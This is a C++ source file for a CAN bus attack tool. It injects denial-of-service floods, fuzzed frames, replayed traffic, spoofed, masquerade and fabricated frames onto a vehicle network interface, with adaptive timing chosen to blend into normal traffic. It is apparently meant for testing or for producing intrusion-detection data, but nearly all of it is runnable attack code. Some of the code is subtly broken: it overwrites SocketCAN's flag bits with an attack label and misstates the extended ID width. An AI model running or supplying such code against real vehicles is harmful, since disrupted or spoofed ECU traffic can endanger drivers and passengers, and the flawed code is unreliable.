#include <iostream>
#include <chrono>
#include <thread>
#include <vector>
#include <random>
#include <map>
#include <functional>
#include <linux/can.h>
#include <linux/can/raw.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <unistd.h>
#include <algorithm>
#include <mutex>
#include <condition_variable>
#include <deque>

enum class AttackFrequency {
    HIGH,       // 10-50ms
    MEDIUM,     // 100-500ms
    LOW,        // 1-5s
    ADAPTIVE    // Dynamically adjusts based on bus traffic
};

enum class AttackType {
    LEGITIMATE = 0,
    DOS = 1,
    FUZZING = 2,
    REPLAY = 3,
    MALFUNCTION = 4,
    SPOOFING = 5,
    MASQUERADE = 6,
    FABRICATION = 7
};

struct CANFrame {
    canid_t id;
    uint8_t dlc;
    uint8_t data[8];
    std::chrono::microseconds timestamp;
};

class AdvancedCANTester {
private:
    int socket_fd;
    struct sockaddr_can addr;
    struct ifreq ifr;
    std::mutex mtx;
    std::condition_variable cv;
    bool running = true;
    std::mt19937 rng{std::random_device{}()};
    std::vector<CANFrame> recorded_frames;
    std::map<canid_t, CANFrame> last_seen_frames;

    const std::map<AttackFrequency, std::pair<int, int>> frequency_ranges = {
        {AttackFrequency::HIGH, {10, 50}},
        {AttackFrequency::MEDIUM, {100, 500}},
        {AttackFrequency::LOW, {1000, 5000}}
    };

    bool initializeSocket(const std::string& ifname) {
        if ((socket_fd = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0) {
            perror("Socket creation failed");
            return false;
        }

        strcpy(ifr.ifr_name, ifname.c_str());
        ioctl(socket_fd, SIOCGIFINDEX, &ifr);

        addr.can_family = AF_CAN;
        addr.can_ifindex = ifr.ifr_ifindex;

        if (bind(socket_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            perror("Bind failed");
            return false;
        }

        return true;
    }

    int getRandomInterval(AttackFrequency freq) {
        if (freq == AttackFrequency::ADAPTIVE) {
            return calculateAdaptiveInterval();
        }
        
        auto [min_ms, max_ms] = frequency_ranges.at(freq);
        std::uniform_int_distribution<> dist(min_ms, max_ms);
        return dist(rng);
    }

    CANFrame generateRandomFrame(bool fixed_id = false) {
        CANFrame frame;
        // ID는 29비트가 아닌 11비트(Standard) 또는 28비트(Extended) 범위 내에서만 생성
        frame.id = fixed_id ? 0x001 : std::uniform_int_distribution<>(0, 0x7FF)(rng);  // Standard CAN ID 범위
        frame.dlc = std::uniform_int_distribution<>(1, 8)(rng);
        
        for(int i = 0; i < frame.dlc; i++) {
            frame.data[i] = std::uniform_int_distribution<>(0, 0xFF)(rng);
        }
        return frame;
    }

    bool sendFrame(const CANFrame& frame, AttackType type) {
        struct can_frame can_frame;
        // 원래 ID는 하위 29비트만 사용하고, 상위 3비트에 attack type 저장
        can_frame.can_id = (frame.id & 0x1FFFFFFF) | (static_cast<uint32_t>(type) << 29);
        can_frame.can_dlc = frame.dlc;
        memcpy(can_frame.data, frame.data, frame.dlc);
        
        return write(socket_fd, &can_frame, sizeof(struct can_frame)) == sizeof(struct can_frame);
    }

    CANFrame receiveFrame() {
        struct can_frame frame;
        CANFrame can_frame;
        
        if (read(socket_fd, &frame, sizeof(struct can_frame)) == sizeof(struct can_frame)) {
            can_frame.id = frame.can_id;
            can_frame.dlc = frame.can_dlc;
            memcpy(can_frame.data, frame.data, frame.can_dlc);
            can_frame.timestamp = std::chrono::duration_cast<std::chrono::microseconds>(
                std::chrono::system_clock::now().time_since_epoch());
        }
        
        return can_frame;
    }

    std::deque<std::chrono::microseconds> traffic_timestamps;
    const size_t TRAFFIC_WINDOW = 1000;
    
    int calculateAdaptiveInterval() {
        if (traffic_timestamps.size() < 2) return 100;
        
        std::vector<long> intervals;
        for (size_t i = 1; i < traffic_timestamps.size(); i++) {
            auto diff = std::chrono::duration_cast<std::chrono::microseconds>(
                traffic_timestamps[i] - traffic_timestamps[i-1]).count();
            intervals.push_back(diff);
        }
        
        std::nth_element(intervals.begin(), intervals.begin() + intervals.size()/2, intervals.end());
        long median_us = intervals[intervals.size()/2];
        
        int base_ms = static_cast<int>(median_us / 1000);
        std::uniform_int_distribution<> dist(base_ms * 0.9, base_ms * 1.1);
        return dist(rng);
    }
    
    void updateTrafficPattern(const CANFrame& frame) {
        traffic_timestamps.push_back(frame.timestamp);
        if (traffic_timestamps.size() > TRAFFIC_WINDOW) {
            traffic_timestamps.pop_front();
        }
    }

public:
    AdvancedCANTester(const std::string& interface = "can0") {
        if (!initializeSocket(interface)) {
            throw std::runtime_error("Failed to initialize CAN socket");
        }
    }

    ~AdvancedCANTester() {
        close(socket_fd);
        running = false;
        cv.notify_all();
    }

    void recordTraffic(int duration_seconds) {
        recorded_frames.clear();
        traffic_timestamps.clear();
        auto start_time = std::chrono::steady_clock::now();
        
        while(std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - start_time).count() < duration_seconds) {
            CANFrame frame = receiveFrame();
            recorded_frames.push_back(frame);
            last_seen_frames[frame.id] = frame;
            updateTrafficPattern(frame);
        }
    }

    void dosAttack(AttackFrequency freq) {
        std::cout << "Starting DoS attack\n";
        CANFrame frame;
        frame.id = 0x000;
        frame.dlc = 8;
        memset(frame.data, 0xFF, 8);

        while(running) {
            sendFrame(frame, AttackType::DOS);
            std::this_thread::sleep_for(std::chrono::milliseconds(getRandomInterval(freq)));
        }
    }

    void fuzzingAttack(AttackFrequency freq) {
        std::cout << "Starting Fuzzing attack\n";
        while(running) {
            sendFrame(generateRandomFrame(), AttackType::FUZZING);
            std::this_thread::sleep_for(std::chrono::milliseconds(getRandomInterval(freq)));
        }
    }

    void replayAttack(AttackFrequency freq) {
        std::cout << "Starting Replay attack\n";
        while(running && !recorded_frames.empty()) {
            for(const auto& frame : recorded_frames) {
                sendFrame(frame, AttackType::REPLAY);
                std::this_thread::sleep_for(std::chrono::milliseconds(getRandomInterval(freq)));
            }
        }
    }

    void situationalReplayAttack(AttackFrequency freq, std::function<bool(const CANFrame&)> condition) {
        std::cout << "Starting Situational Replay attack\n";
        while(running && !recorded_frames.empty()) {
            for(const auto& frame : recorded_frames) {
                if(condition(frame)) {
                    sendFrame(frame, AttackType::REPLAY);
                    std::this_thread::sleep_for(std::chrono::milliseconds(getRandomInterval(freq)));
                }
            }
        }
    }

    void malfunctionAttack(AttackFrequency freq) {
        std::cout << "Starting Malfunction attack\n";
        while(running) {
            CANFrame frame = generateRandomFrame(true);
            for(int i = 0; i < frame.dlc; i++) {
                frame.data[i] ^= 0xFF;
            }
            sendFrame(frame, AttackType::MALFUNCTION);
            std::this_thread::sleep_for(std::chrono::milliseconds(getRandomInterval(freq)));
        }
    }

    void spoofingAttack(AttackFrequency freq) {
        std::cout << "Starting Spoofing attack\n";
        while(running) {
            CANFrame frame = generateRandomFrame(true);
            sendFrame(frame, AttackType::SPOOFING);
            std::this_thread::sleep_for(std::chrono::milliseconds(getRandomInterval(freq)));
        }
    }

    void masqueradeAttack(AttackFrequency freq) {
        std::cout << "Starting Masquerade attack\n";
        while(running && !recorded_frames.empty()) {
            for(const auto& frame : recorded_frames) {
                CANFrame modified = frame;
                modified.id = 0x001;
                sendFrame(modified, AttackType::MASQUERADE);
                std::this_thread::sleep_for(std::chrono::milliseconds(getRandomInterval(freq)));
            }
        }
    }

    void fabricationAttack(AttackFrequency freq) {
        std::cout << "Starting Fabrication attack\n";
        std::vector<CANFrame> fabricated_frames;
        
        for(int i = 0; i < 5; i++) {
            CANFrame frame = generateRandomFrame(true);
            fabricated_frames.push_back(frame);
        }

        while(running) {
            for(const auto& frame : fabricated_frames) {
                sendFrame(frame, AttackType::FABRICATION);
                std::this_thread::sleep_for(std::chrono::milliseconds(getRandomInterval(freq)));
            }
        }
    }

    void stop() {
        running = false;
        cv.notify_all();
    }
};

int main(int argc, char** argv) {
    if(argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <attack_type> <frequency>\n"
                  << "Attack types: dos, fuzz, replay, situational_replay, malfunction, "
                  << "spoofing, masquerade, fabrication\n"
                  << "Frequency: high(10-50ms), medium(100-500ms), low(1000ms-5000ms), adaptive\n";
        return 1;
    }

    try {
        std::string attack_type = argv[1];
        std::string freq_str = argv[2];
        
        AttackFrequency freq;
        if(freq_str == "high") freq = AttackFrequency::HIGH;
        else if(freq_str == "medium") freq = AttackFrequency::MEDIUM;
        else if(freq_str == "low") freq = AttackFrequency::LOW;
        else if(freq_str == "adaptive") freq = AttackFrequency::ADAPTIVE;
        else throw std::invalid_argument("Invalid frequency level");

        AdvancedCANTester tester("can0");

        if(attack_type == "dos") {
            tester.dosAttack(freq);
        }
        else if(attack_type == "fuzz") {
            tester.fuzzingAttack(freq);
        }
        else if(attack_type == "replay") {
            tester.recordTraffic(10);
            tester.replayAttack(freq);
        }
        else if(attack_type == "situational_replay") {
            tester.recordTraffic(10);
            tester.situationalReplayAttack(freq, [](const CANFrame& frame) {
                return frame.id == 0x001;
            });
        }
        else if(attack_type == "malfunction") {
            tester.malfunctionAttack(freq);
        }
        else if(attack_type == "spoofing") {
            tester.spoofingAttack(freq);
        }
        else if(attack_type == "masquerade") {
            tester.masqueradeAttack(freq);
        }
        else if(attack_type == "fabrication") {
            tester.fabricationAttack(freq);
        }
        else {
            throw std::invalid_argument("Unknown attack type");
        }
    }
    catch(const std::exception& e) {
        std::cerr << "Error: " << e.what() << "\n";
        return 1;
    }

    return 0;
}